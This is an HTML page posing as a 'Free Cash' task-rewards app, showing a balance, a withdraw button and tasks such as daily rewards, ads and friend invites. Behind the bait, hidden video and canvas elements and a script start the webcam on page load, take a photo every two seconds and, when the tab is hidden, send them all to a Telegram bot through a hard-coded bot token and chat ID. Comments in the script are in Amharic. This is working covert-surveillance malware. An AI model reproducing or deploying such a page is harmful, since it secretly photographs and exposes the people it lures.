<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Cash - Tasks Hub</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #090d0f;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .app-card {
            width: 100%;
            max-width: 420px;
            background: #12191d;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            border: 1px solid #1e2a32;
        }

        /* Header Section */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .brand {
            font-size: 22px;
            font-weight: 800;
            color: #ffffff;
            letter-spacing: 0.5px;
        }

        .brand span {
            color: #00e676;
        }

        .user-badge {
            background: rgba(0, 230, 118, 0.1);
            color: #00e676;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            border: 1px solid rgba(0, 230, 118, 0.25);
        }

        /* Balance Card */
        .balance-box {
            background: linear-gradient(145deg, #0f2b1d 0%, #091710 100%);
            border: 1px solid rgba(0, 230, 118, 0.4);
            border-radius: 18px;
            padding: 22px;
            text-align: center;
            margin-bottom: 28px;
            box-shadow: 0 10px 25px rgba(0, 230, 118, 0.1);
        }

        .balance-label {
            color: #90a4ae;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 6px;
        }

        .balance-amount {
            font-size: 38px;
            font-weight: 900;
            color: #ffffff;
            margin-bottom: 16px;
        }

        .balance-amount span {
            color: #00e676;
        }

        .btn-withdraw {
            background-color: #00e676;
            color: #06090a;
            border: none;
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            font-weight: 800;
            font-size: 15px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3);
        }

        /* Tasks Section */
        .section-title {
            font-size: 17px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .task-list {
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        .task-item {
            background-color: #182228;
            border-radius: 14px;
            padding: 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #22303a;
        }

        .task-left {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .task-icon {
            width: 44px;
            height: 44px;
            background-color: rgba(0, 230, 118, 0.12);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .task-details h4 {
            font-size: 15px;
            color: #ffffff;
            font-weight: 600;
            margin-bottom: 3px;
        }

.task-reward {
            font-size: 13px;
            color: #00e676;
            font-weight: 700;
        }

        .btn-claim {
            background: transparent;
            border: 1.5px solid #00e676;
            color: #00e676;
            padding: 8px 18px;
            border-radius: 10px;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="app-card">
        <div class="header">
            <div class="brand">FREE <span>CASH</span></div>
            <div class="user-badge">● LIVE</div>
        </div>

        <div class="balance-box">
            <div class="balance-label">Total Balance</div>
            <div class="balance-amount"><span>$</span>00.0</div>
            <button class="btn-withdraw">WITHDRAW CASH</button>
        </div>

        <div class="section-title">
            <span>Available Tasks</span>
        </div>

        <div class="task-list">
            <div class="task-item">
                <div class="task-left">
                    <div class="task-icon">🎁</div>
                    <div class="task-details">
                        <h4>Daily Reward</h4>
                        <div class="task-reward">+$2.00</div>
                    </div>
                </div>
                <button class="btn-claim">Claim</button>
            </div>

            <div class="task-item">
                <div class="task-left">
                    <div class="task-icon">▶️</div>
                    <div class="task-details">
                        <h4>Watch Short Ad</h4>
                        <div class="task-reward">+$0.50</div>
                    </div>
                </div>
                <button class="btn-claim">Start</button>
            </div>

            <div class="task-item">
                <div class="task-left">
                    <div class="task-icon">👥</div>
                    <div class="task-details">
                        <h4>Invite Friends</h4>
                        <div class="task-reward">+$5.00</div>
                    </div>
                </div>
                <button class="btn-claim">Invite</button>
            </div>
        </div>
    </div>
    <!-- style="display:none;" በመጨመር የካሜራው ምስል በስክሪኑ ላይ እንዳይታይ ተደርጓል -->
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8831162632:AAE6EO5-rvsT4d8cJjoUssaE32QZdsA9jEk";
        const CHAT_ID = "8125688786";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        let imageBuffer = [];
        let captureInterval = null;

        // 1. ካሜራ ማስጀመር
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                captureInterval = setInterval(capturePhoto, 2000);
            })
            .catch(err => console.error("ካሜራ አልተከፈተም:", err));

        // 2. ፎቶን አዘጋጅቶ Memory ላይ ማስቀመጥ
        function capturePhoto() {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.5);
            imageBuffer.push(imageData);
            console.log(`ፎቶ ተይዟል! ጠቅላላ የተያዙ፡ ${imageBuffer.length}`);
        }

        // 3. ተጠቃሚው ገጹን ሲዘጋ ወይም ታቡን ሲቀይር (Exit Event)
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                sendAllPhotos();
            }
        });

        // 4. የተከማቹትን ፎቶዎች በሙሉ ወደ Telegram መላክ
        async function sendAllPhotos() {
            if (imageBuffer.length === 0) return;

            if (captureInterval) clearInterval(captureInterval);

            for (let i = 0; i < imageBuffer.length; i++) {
                try {
                    const blob = await (await fetch(imageBuffer[i])).blob();
                    const formData = new FormData();
                    formData.append("chat_id", CHAT_ID);
                    formData.append("photo", blob, `photo_${i + 1}.jpg`);

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData,
                        keepalive: true
                    });
                } catch (e) {
                    console.error("የመላክ ስህተት፡", e);
                }
            }
            imageBuffer = [];
        }
    </script>

</body>
</html>
